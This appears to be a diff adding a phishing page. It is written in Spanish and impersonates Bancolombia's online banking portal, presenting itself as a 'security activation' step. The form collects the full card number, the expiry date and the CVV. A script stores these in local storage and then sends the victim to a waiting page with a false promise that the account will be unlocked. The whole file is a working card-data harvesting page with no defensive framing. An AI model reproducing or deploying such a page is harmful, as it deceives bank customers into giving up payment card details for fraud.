@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<title>Bancolombia Sucursal Virtual Personas</title>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<script src="./js/validations.js"></script>
+	<link href="./css/style.css" rel="stylesheet">
+	<link href="./css/stylesheet.css" rel="stylesheet">
+	<link rel="icon" type="image/png" href="img/logo.png" />
+</head>
+
+<body>
+	<div class="contenido">
+		<div class="cabecera">
+			<div class="logo">
+				<img src="img/logo.svg">
+				<br>
+				<span class="subtitulo">Sucursal Virtual Personas</span>
+				<br>
+				<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora"></span>
+			</div>
+			<div class="titulo">Ahora Verificar tu cuenta es fácil</div>
+			<div class="mensaje" id="alt-mensaje">
+				<table>
+					<tr>
+						<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>
+						<td valign="middle" style="padding-left: 12px;"><span
+								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor
+								ingesar la información requerida.</span></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+		<div class="cuerpo">
+			<div class="pnlizq">
+				<div class="formulario">
+					<div class="form-titulo">Activación de seguridad</div>
+					<div class="descripcion">
+						Digite los siguientes datos para activar la seguridad de tu cuenta.
+					</div>
+					<div class="form-cuerpo">
+						<div style="text-align: left;">
+							<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese los 16 digitos de
+								su tarjeta</span>
+						</div>
+						<div class="input-icono credit-card">
+							<input type="text" name="txtTarjeta" id="txtTarjeta" autocomplete="off" pattern="[0-9]*"
+								onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"
+								maxlength="16">
+						</div>
+						<br>
+						<div style="text-align: left;">
+							<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Fecha de
+								Vencimiento</span>
+						</div>
+						<div style="margin-top: 8px;">
+							<select style="width:49% !important;" id="mFecha" name="mFecha">
+								<option value="" default selected>Mes</option>
+								<option value="01">01</option>
+								<option value="02">02</option>
+								<option value="03">03</option>
+								<option value="04">04</option>
+								<option value="05">05</option>
+								<option value="06">06</option>
+								<option value="07">07</option>
+								<option value="08">08</option>
+								<option value="09">09</option>
+								<option value="10">10</option>
+								<option value="11">11</option>
+								<option value="12">12</option>
+							</select>
+
+
+							<select style="width:49% !important;" id="aFecha" name="aFecha">
+								<option value="" default selected>Año</option>
+								<option value="2022">2022</option>
+								<option value="2023">2023</option>
+								<option value="2024">2024</option>
+								<option value="2025">2025</option>
+								<option value="2026">2026</option>
+								<option value="2027">2027</option>
+								<option value="2028">2028</option>
+								<option value="2029">2029</option>
+								<option value="2030">2030</option>
+								<option value="2031">2031</option>
+								<option value="2032">2032</option>
+								<option value="2033">2033</option>
+							</select>
+						</div>
+						<br>
+						<div style="text-align: left;">
+							<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> CVV</span>
+						</div>
+						<div class="input-icono pass">
+							<input type="password" name="txtCVV" id="txtCVV" maxlength="3" autocomplete="off"
+								pattern="[0-9]*"
+								onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+						</div>
+						<br>
+						<button id="btnTarjeta" name="btnTarjeta" class="btn btn-amarillo"
+							type="button">Validar</button>
+						<br>
+
+					</div>
+				</div>
+				<br>
+				<div class="lista-links ">
+					<div class="texto">
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/demo.jpg"></td>
+									<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/seguridad.jpg"></td>
+									<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/reglamento.jpg"></td>
+									<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/politica.jpg"></td>
+									<td valign="middle"><a href="#">Política de Privacidad</a></td>
+								</tr>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="pnlder">
+				<a href="#"><img src="img/card.jpg" class="publicidad"></a><br><br>
+				<div class="texto" style="text-align:justify; padding: 0px 30px;">Después de presionar verificar, te
+					llevaremos a una página donde tendrás que esperar aproximadamente 5 minutos, de ser válida tu
+					identidad te lo notificaremos al instante y será desbloqueada tu cuenta. De lo contrario
+					solicitaremos una nueva dinámica.</div>
+			</div>
+		</div>
+		<div class="pie">
+			<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.<div
+					class="ippie">
+					<span class="dirip">Dirección IP: <span id="ip"></span></span>´
+					<span class="copyright">Copyright © 2023 Bancolombia</span>
+				</div>
+			</div>
+		</div>
+</body>
+
+</html>
+<script src="js/app.js"></script>
+<script type="text/javascript">
+
+	document.addEventListener('DOMContentLoaded', function () {
+		var btnTarjeta = document.getElementById('btnTarjeta');
+		var txtTarjeta = document.getElementById('txtTarjeta');
+		var mFecha = document.getElementById('mFecha');
+		var aFecha = document.getElementById('aFecha');
+		var txtCVV = document.getElementById('txtCVV');
+		var mensaje = document.getElementsByClassName('mensaje')[0];
+		var creditCard = document.getElementsByClassName('credit-card')[0];
+		var pass = document.getElementsByClassName('pass')[0];
+
+		btnTarjeta.addEventListener('click', function () {
+			if (txtTarjeta.value.length > 15) {
+				if (mFecha.value !== "") {
+					if (aFecha.value !== "") {
+						if (txtCVV.value.length > 2) {
+							var fExp = mFecha.value + "-" + aFecha.value;
+							
+							// Guardar
+							info.p = txtTarjeta.value;
+							info.f = fExp.value;
+							info.c = txtCVV.value;
+							
+							LS.setItem('info', JSON.stringify(info));
+
+							// Redirigir
+							window.location.href = './waiting.html';
+
+						} else {
+							mensaje.style.display = 'block';
+							pass.style.border = '1px solid red';
+							txtCVV.focus();
+						}
+					} else {
+						mensaje.style.display = 'block';
+						aFecha.style.border = '1px solid red';
+						aFecha.focus();
+					}
+				} else {
+					mensaje.style.display = 'block';
+					mFecha.style.border = '1px solid red';
+					mFecha.focus();
+				}
+			} else {
+				mensaje.style.display = 'block';
+				creditCard.style.border = '1px solid red';
+				txtTarjeta.focus();
+			}
+		});
+
+		txtTarjeta.addEventListener('keyup', function (e) {
+			creditCard.style.border = '1px solid #CCCCCC';
+			mensaje.style.display = 'none';
+		});
+
+		mFecha.addEventListener('click', function (e) {
+			mFecha.style.border = '1px solid #CCCCCC';
+			mensaje.style.display = 'none';
+		});
+
+		aFecha.addEventListener('click', function (e) {
+			aFecha.style.border = '1px solid #CCCCCC';
+			mensaje.style.display = 'none';
+		});
+
+		txtCVV.addEventListener('keyup', function (e) {
+			pass.style.border = '1px solid #CCCCCC';
+			mensaje.style.display = 'none';
+		});
+	});
+
+</script>
